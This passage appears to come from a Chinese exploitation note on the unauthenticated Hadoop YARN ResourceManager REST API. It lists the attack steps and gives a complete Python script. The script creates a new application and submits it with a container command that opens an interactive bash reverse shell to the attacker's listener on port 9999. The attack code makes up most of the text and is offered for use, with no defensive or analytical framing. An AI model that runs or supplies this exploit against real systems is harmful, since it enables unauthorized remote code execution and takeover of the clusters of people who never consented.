	http://192.168.1.1:8088/cluster
	本地监听端口 >> 创建Application >> 调用Submit Application API提交
```python
#!/usr/bin/env python
import requests

target = 'http://192.168.18.129:8088/'
lhost = '192.168.18.138' # put your local host ip here, and listen at port 9999

url = target + 'ws/v1/cluster/apps/new-application'
resp = requests.post(url)
app_id = resp.json()['application-id']
url = target + 'ws/v1/cluster/apps'
data = {
    'application-id': app_id,
    'application-name': 'get-shell',
    'am-container-spec': {
        'commands': {
            'command': '/bin/bash -i >& /dev/tcp/%s/9999 0>&1' % lhost,
        },
    },
    'application-type': 'YARN',
}
requests.post(url, json=data)
```